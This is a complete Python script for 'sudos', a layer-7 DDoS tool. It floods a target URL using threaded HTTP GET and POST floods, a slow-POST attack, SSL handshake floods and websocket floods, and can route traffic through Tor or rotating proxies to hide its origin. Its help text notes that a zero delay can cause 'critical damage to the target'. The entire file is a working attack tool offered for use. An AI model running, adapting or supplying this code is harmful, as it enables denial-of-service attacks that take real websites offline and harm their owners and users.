#!/usr/bin/python3
#Version: 2.7.0
#Source: https://github.com/lilmond/sudos

from urllib.parse import urlparse

import threading
import websocket
import argparse
import requests
import random
import socket
import socks
import time
import sys
import ssl
import os

with open("etc/useragents.txt", "r") as file:
    useragents = file.read().splitlines()
    file.close()

attack_methods = {}

def attack_method(method_name: str):
    def method(function):
        attack_methods[method_name] = function

    return method

class Sudos(object):
    active_threads = 0
    sent_requests = 0

    def __init__(self, url: str, threads: int, attack_method: str = "http-get", delay: float = 1, headers: dict = None, payload: str = None, timeout: int = 10, quiet: bool = False, tor: bool = False, proxy_list: list = None, test: bool = False):
        self.url = url
        self.threads = threads
        self.attack_method = attack_method
        self.delay = delay
        self.headers = headers
        self.payload = payload
        self.timeout = timeout
        self.quiet = quiet
        self.tor = tor
        self.proxy_list = proxy_list
        self.test = test

        parsed_url = urlparse(url)
        self.parsed_url = parsed_url

        if parsed_url.hostname.endswith(".onion"):
            self.host_ip = parsed_url.hostname
        else:
            self.host_ip = socket.gethostbyname(parsed_url.hostname)

        port = parsed_url.port

        if not port:
            if parsed_url.scheme == "https":
                port = 443
            else:
                port = 80
        
        self.port = port

    def test_attack(self):
        print(f"Connecting to {self.host_ip}:{self.port}")
        start_time = time.time()
        sock = self.create_sock()
        end_time = time.time()
        timestamp = f"{((end_time - start_time) * 1000):.2f}"
        print(f"Connected to {self.host_ip}:{self.port}. Timestamp: {timestamp} ms\n")

        if self.parsed_url.scheme == "https":
            ctx = ssl._create_unverified_context()
            sock = ctx.wrap_socket(sock=sock, server_hostname=self.parsed_url.hostname)
        
        attack_methods[self.attack_method](self, sock)

        print(f"Web server's response:".center(os.get_terminal_size().columns, "-"))
        try:
            while True:
                chunk = sock.recv(1024)

                if not chunk:
                    break

                print(chunk)
        except TimeoutError:
            return

    def attack_handler(self):
        while True:
            if self.active_threads >= self.threads:
                time.sleep(0.01)
                continue

            threading.Thread(target=self.create_attack_instance, daemon=True).start()

    def create_attack_instance(self):
        self.active_threads += 1
        try:
            sock = self.create_sock()

            if self.attack_method.startswith("http"):
                if self.parsed_url.scheme == "https":
                    ctx = ssl._create_unverified_context()
                    sock = ctx.wrap_socket(sock=sock, server_hostname=self.parsed_url.hostname)

            attack_methods[self.attack_method](self, sock)
        except Exception as e:
            if not self.quiet:
                print(f"attack error: {e}. Use -q/--quiet to hide errors")
            return
        finally:
            self.active_threads -= 1
    
    def create_sock(self):
        if self.tor or self.proxy_list:
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)

            if self.tor:
                sock.set_proxy(proxy_type=socks.SOCKS5, addr="127.0.0.1", port=9050)

            elif self.proxy_list:
                proxy = self.get_proxy()
                proxy_url = urlparse(proxy)
                proxy_type = getattr(socks, proxy_url.scheme.upper())
                sock.set_proxy(proxy_type=proxy_type, addr=proxy_url.hostname, port=proxy_url.port)

        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        sock.settimeout(self.timeout)
        sock.connect((self.host_ip, self.port))

        return sock
    
    def get_proxy(self):
        proxy = self.proxy_list.pop(0)
        self.proxy_list.append(proxy)
        
        return proxy

    def get_headers(self):
        default_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "max-age=0",
            "Connection": "Keep-Alive",
            "Dnt": "1",
            "Host": f"{self.parsed_url.hostname}{f':{self.port}' if not self.port in [80, 443] else ''}",
            "Sec-Ch-Ua": '"Microsoft Edge";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": random.choice(useragents)
        }

        if self.test:
            del default_headers["Accept-Encoding"]

        if self.headers:
            default_headers.update(self.headers)
        
        return default_headers

    @attack_method("http-get")
    def http_get(self, sock: socket.socket):
        headers = self.get_headers()

        http_data = f"GET {self.parsed_url.path} HTTP/1.1\r\n"

        for header in headers:
            http_data += f"{header}: {headers[header]}\r\n"
        
        http_data += "\r\n"

        sock.send(http_data.encode())

        self.sent_requests += 1
    
    @attack_method("http-get-rapid")
    def http_get_rapid(self, sock: socket.socket):
        for i in range(1000):
            attack_methods["http-get"](self, sock=sock)
            time.sleep(self.delay)
    
    @attack_method("http-post")
    def http_post(self, sock: socket.socket):
        random_bytes = random._urandom(512)
        headers = self.get_headers()
        headers["Content-Length"] = len(random_bytes)

        http_data = f"POST {self.parsed_url.path} HTTP/1.1\r\n"

        for header in headers:
            http_data += f"{header}: {headers[header]}\r\n"
        
        http_data += "\r\n"

        sock.send(http_data.encode())
        sock.send(random_bytes)

        self.sent_requests += 1
    
    @attack_method("http-post-slow")
    def http_post_slow(self, sock: socket.socket):
        content_length = random.randrange(512, 1024)
        headers = self.get_headers()
        headers["Content-Length"] = content_length

        http_data = f"POST {self.parsed_url.path} HTTP/1.1\r\n"

        for header in headers:
            http_data += f"{header}: {headers[header]}\r\n"
        
        http_data += "\r\n"

        sock.send(http_data.encode())

        for i in range(content_length):
            sock.send(random._urandom(1))
            time.sleep(self.delay)
            self.sent_requests += 1

    @attack_method("http-post-custom")
    def http_post_custom(self, sock: socket.socket):
        payload = self.payload
        headers = self.get_headers()
        headers["Content-Length"] = len(payload)

        http_data = f"POST {self.parsed_url.path} HTTP/1.1\r\n"

        for header in headers:
            http_data += f"{header}: {headers[header]}\r\n"
        
        http_data += "\r\n"

        sock.send(http_data.encode())
        sock.send(payload.encode())

        self.sent_requests += 1

    @attack_method("ssl-flood")
    def ssl_flood(self, sock: socket.socket):
        ctx = ssl._create_unverified_context()
        ctx.wrap_socket(sock=sock, server_hostname=self.parsed_url.hostname)
        self.sent_requests += 1
        time.sleep(self.delay)
    
    @attack_method("websocket-flood")
    def websocket_flood(self, sock: socket.socket):
        ws = websocket.WebSocket()
        ws.connect(self.url)

        while True:
            ws.send(random._urandom(1024))
            ws.recv()
            self.sent_requests += 1
            time.sleep(self.delay)

class Colors:
    red = "\u001b[31;1m"
    green = "\u001b[32;1m"
    yellow = "\u001b[33;1m"
    blue = "\u001b[34;1m"
    purple = "\u001b[35;1m"
    cyan = "\u001b[36;1m"
    reset = "\u001b[0;0m"

def clear_console():
    if sys.platform == "win32":
        os.system("cls")
    elif sys.platform in ["linux", "linux2"]:
        os.system("clear")

def show_banner():
    with open("banner.txt", "r") as file:
        banner = file.read()
        file.close()
    
    terminal_columns = os.get_terminal_size().columns
    max_line_cols = 0

    for line in banner.splitlines():
        line_cols = len(line)

        if line_cols > max_line_cols:
            max_line_cols = line_cols
    
    for line in banner.splitlines():
        print(f"{Colors.red}{' ' * int((terminal_columns - max_line_cols) / 2)}{line}{Colors.reset}")

def main():
    clear_console()
    show_banner()

    attack_methods = ["http-get", "http-get-rapid", "http-post", "http-post-slow", "http-post-custom", "ssl-flood", "websocket-flood"]

    parser = argparse.ArgumentParser(description="Layer-7 Python DDoS Tool.")
    parser.add_argument("url", metavar="URL", type=str, help="Target's full URL.")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Attack threads. The more, the stronger. Default: 20")
    parser.add_argument("-m", "--method", metavar="ATTACK METHOD", type=str, default="http-get", choices=attack_methods)
    parser.add_argument("-d", "--delay", type=float, default=1, help="Sleep time between HTTP requests. Tip: setting this to 0 with http-get-rapid method may cause critical damage to the target, even with only 20 threads. Though may cause the statistics to be innacurate, so set only to at least 0.1.")
    parser.add_argument("-c", "--timeout", type=int, default=10, help="Socket connection timeout. Default: 10")
    parser.add_argument("-l", "--proxy-list", metavar="FILE", type=argparse.FileType("r"), help="Use a custom proxy list. You can use Proxal to get a good proxy list.")
    parser.add_argument("-H", "--headers", action="append", help="Add an HTTP header. Example: -H/--header \"Authorization: someauthorizationheadervalue\"")
    parser.add_argument("-q", "--quiet", action="store_true", default=False, help="Supress error messages.")
    parser.add_argument("--duration", type=int, default=None, help="Set how long the attack will be running for. This is by default is set to None and will keep running forever until stopped manually.")
    parser.add_argument("--payload", type=str, help="This is required to define HTTP-POST-CUSTOM payload.")
    parser.add_argument("--test", action="store_true", default=False, help="Use this for testing and viewing the web server's response to the attack's request.")
    parser.add_argument("--tor", action="store_true", default=False, help="Use Tor proxies for the attack.")
    
    args = parser.parse_args()

    if args.proxy_list and args.tor:
        print("Error: You cannot use -l/--proxy-list and --tor at the same time.")
        return

    if args.method in ["http-post", "http-post-slow", "http-post-custom"]:
        print(f"HTTP post attack method detected, please note that most secure web servers may require \"Origin\" and \"Referer\" or extra additional headers like \"X-Csrf-Token\" to accept the requests. Use --test to verify that your requests are working.\n\nAlso don't forget to to set the \"Content-Type\" headers, for example: -H/--headers \"Content-Tye: application/json\". \"Content-Length\" will automatically be set for you.\n\nNote: Above information is important especially when performing http-post-custom attack method.\n")

    match args.method:
        case "http-post-slow":
            print(f"Information: http-post-slow's HR/S will be based on bytes sent per second.\n")

        case "http-post-custom":
            if not args.payload:
                print(f"Error: http-post-custom requires --payload")
                return
        
        case "websocket-flood":
            if any([args.tor, args.proxy_list]):
                print(f"Error: websocket-flood currently does not support -l/--proxy-list or --tor.")
                return

    custom_headers = {}

    if args.headers:
        for header in args.headers:
            try:
                header_name, header_value = header.split(":", 1)
                header_name = header_name.strip()
                header_value = header_value.strip()
                custom_headers[header_name] = header_value
            except Exception:
                print(f"Error: Unable to parse header: {header}")
                return

    if args.proxy_list:
        proxies_list = args.proxy_list.read().strip().splitlines()
    else:
        proxies_list = None

    sudos = Sudos(url=args.url, threads=args.threads, attack_method=args.method, delay=args.delay, headers=custom_headers, payload=args.payload, timeout=args.timeout, quiet=args.quiet, tor=args.tor, proxy_list=proxies_list, test=args.test)

    if args.test:
        if args.method in ["http-get-rapid", "http-post-slow", "ssl-flood", "websocket-flood"]:
            print(f"Error: Due to how {args.method} works, it does not support --test")
            return

        sudos.test_attack()
        return

    threading.Thread(target=sudos.attack_handler, daemon=True).start()
    print(f"Attack has been initialized. Press {Colors.blue}<ENTER>{Colors.reset} or {Colors.blue}<CTRL + C>{Colors.reset} to stop manually.")


    def statistics():
        last_requests = 0
        hrs = 0
        last_hrs_time = time.time()
        print("\033[?25l", end="") # Hides the blinking cursor

        if args.duration:
            attack_timeout = time.time() + args.duration

        while True:
            total_requests = sudos.sent_requests

            if time.time() - last_hrs_time >= 1:
                hrs = total_requests - last_requests
                last_hrs_time = time.time()
                last_requests = total_requests

            terminal_column = os.get_terminal_size().columns

            text = f"HR/S: {Colors.blue}{hrs:,}{Colors.reset} Total: {Colors.blue}{total_requests:,}{Colors.reset}"
            
            if args.duration:
                timeout_countdown = f"{(attack_timeout - time.time()):.2f}"

                if float(timeout_countdown) <= 0:
                    timeout_countdown = "Timed out"

                text += f" Countdown: {Colors.blue}{timeout_countdown}{Colors.reset}"

            sys.stdout.write(f"\r{text}{' ' * int(terminal_column - len(text))}\r")
            sys.stdout.flush()

            if args.duration:
                if time.time() >= attack_timeout:
                    break

            time.sleep(0.11)
    
    threading.Thread(target=statistics, daemon=True).start()
    input()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()
    finally:
        print("\n")
        print("\033[?25h", end="") # Shows the blinking cursor. Giving it back to you!
